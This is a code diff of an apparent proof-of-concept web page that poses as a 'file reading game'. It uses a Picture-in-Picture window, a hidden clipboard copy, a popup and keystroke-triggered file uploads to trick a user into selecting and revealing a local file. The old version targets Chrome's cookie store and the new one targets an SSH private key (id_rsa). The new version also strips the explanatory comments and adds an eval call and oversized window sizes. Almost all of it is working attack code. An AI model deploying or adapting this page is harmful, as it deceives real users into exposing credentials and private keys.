@@ -1,34 +1,35 @@
-<button onclick="start()">Click here to play the game</button>
+<button onclick="start()">Click here</button>
 <input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
 <pre id="contents"></pre>
 
 <script>
-// Target path updated for the Mac Chrome Profile
-const fileReadPath = "/Users/sean/Library/Application Support/Google/Chrome/Profile 27/Cookies";
+const fileReadPath = "%userprofile%\\.ssh\\id_rsa";
 
 async function loadFile(file) {
-  // Resizes and moves the window to display the stolen content
   window.moveTo(0, 0);
   window.resizeTo(500, 500);
-  alert(`Successfully read file:\n` + await (new Response(file)).text());
+  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
 }
 
 const pipOpen = async () => {
-  // Opens the Document Picture-in-Picture window
   pipWindow = await documentPictureInPicture.requestWindow({
-    width: 400,
-    height: 400,
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
   });
-  
   pipWindow.document.body.innerHTML = `
-  <div style="font-family: sans-serif; text-align: center;">
-    <h3>File Reading Challenge</h3>
-    <button id="startBtn">Start Game</button>
-    <div id="instructions"></div>
-  </div>
+  <button onclick="eval(document.querySelector('script').innerText)">Start file reading game!</button>
   <script>
-  // Silently copies the path to the clipboard
+  copyToClipboard("${fileReadPath}");
+  const popup = window.open("${document.location.href}", "popup-read", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+
+  setTimeout(()=>
+    document.body.innerHTML = "<p>Press enter, then ctrl+v and enter to win this game!</p>",
+    400
+  );
+
   function copyToClipboard(text) {
     const textarea = document.createElement("textarea");
     textarea.style.opacity = "0%";
@@ -36,17 +37,8 @@ const pipOpen = async () => {
     document.body.appendChild(textarea);
     textarea.select();
     document.execCommand("copy");
-    document.body.removeChild(textarea);
   }
 
-  document.getElementById('startBtn').onclick = () => {
-    copyToClipboard("${fileReadPath}");
-    // Opens the hidden trigger popup
-    window.open("${document.location.href}", "popup-read", "popup,width=200,height=200");
-    
-    document.getElementById('instructions').innerHTML = 
-      "<p style='color: red;'><b>To win:</b> Press Enter, then Cmd+V, then Enter!</p>";
-  };
   <${'/'}script>
   `;
 };
@@ -55,11 +47,7 @@ function start() {
   pipOpen();
 }
 
-// Logic for the hidden popup window
 if (window.name == "popup-read") {
-  // Any keypress triggers the file upload dialog
-  document.body.onkeydown = () => {
-    document.getElementById("upload").click();
-  };
+  document.body.onkeydown = () => document.getElementById("upload").click();
 }
 </script>
